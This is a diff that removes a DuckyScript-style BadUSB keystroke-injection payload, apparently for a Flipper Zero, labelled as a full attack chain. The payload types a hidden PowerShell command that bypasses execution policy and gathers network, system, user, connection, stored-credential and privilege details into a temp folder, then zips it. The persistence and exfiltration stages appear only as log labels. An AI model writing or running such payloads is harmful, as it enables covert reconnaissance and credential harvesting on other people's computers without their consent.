@@ -1,7 +1,0 @@
-REM CYBERFLIPPER - IMPOSSIBLE Level
-REM Full Attack Chain - Recon > Harvest > Persist > Exfil > Cover
-DELAY 100
-GUI r
-DELAY 200
-STRING powershell -W Hidden -EP Bypass -C "$d=\"$env:TEMP\cf_chain\";md $d -F;'[P1] RECON'>\"$d\log.txt\";ipconfig /all>\"$d\p1_net.txt\";systeminfo>\"$d\p1_sys.txt\";net user>\"$d\p1_usr.txt\";netstat -ano>\"$d\p1_conn.txt\";'[P2] HARVEST'>>\"$d\log.txt\";cmdkey /list>\"$d\p2_cred.txt\";whoami /all>\"$d\p2_priv.txt\";'[P3] PERSIST'>>\"$d\log.txt\";'[P4] EXFIL'>>\"$d\log.txt\";Compress-Archive $d \"$d.zip\" -F;'[P5] DONE'>>\"$d\log.txt\";explorer $d"
-ENTER
